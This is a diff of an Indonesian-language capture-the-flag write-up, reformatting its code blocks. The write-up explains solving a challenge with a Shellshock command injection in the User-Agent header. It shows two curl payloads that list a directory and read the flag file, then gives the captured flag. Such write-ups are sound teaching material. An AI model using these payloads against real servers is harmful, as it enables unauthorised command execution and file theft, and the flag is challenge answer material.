@@ -16,7 +16,9 @@ Peserta diberikan soal dimana sebuah website dapat meng-handle Bash script. Sebe
 Jadi, pada soal tantangan kali ini kami mencoba untuk melakukan serangan <i>command injection</i> melalui header tepatnya pada sisi <i>User-Agent</i>. Kami menggunakan <i>trigger exploit</i> <b>Shellshock</b> untuk mengetes kerentanan apakah Bash yang terdapat pada situs ini memiliki kerentanan akan serangan tersebut.
 <br />
 Kemudian , untuk mencoba trigger exploit tersebut kami menggunakan curl untuk menjalankan custom <i>User-Agent</i> yang sebelumnya sudah kami beri trigger exploitnya. Selanjutnya kami menjalankan <i>directory listing</i> pada direktori /bin <br />
-<pre>curl -A "() { :;}; /bin/ls;" https://school.fluxfingers.net:1503/?sessid=sessid_anda</pre>
+```bash
+curl -A "() { :;}; /bin/ls;" https://school.fluxfingers.net:1503/?sessid=sessid_anda
+```
 Voila! terdapat beberapa file - file yang menarik disini, berarti ini menunjukkan trigger exploit tersebut berjalan dengan baik.
 <pre>
 404.sh
@@ -27,6 +29,8 @@ index.sh
 </pre>
 Terlihat file <b>flag</b> yang muncul dimana kami yakin itulah file yang menyimpan kalimat dari flag itu sendiri. Maka, perintah terakhir yang dijalankan ialah :
 <br />
-<pre>curl -A "() { :;}; /bin/cat flag;" https://school.fluxfingers.net:1503/?sessid=sessid_anda</pre>
+```bash
+curl -A "() { :;}; /bin/cat flag;" https://school.fluxfingers.net:1503/?sessid=sessid_anda
+```
 <br />
 Didapatkan flag: <b>flag{as_classic_as_it_could_be}</b>
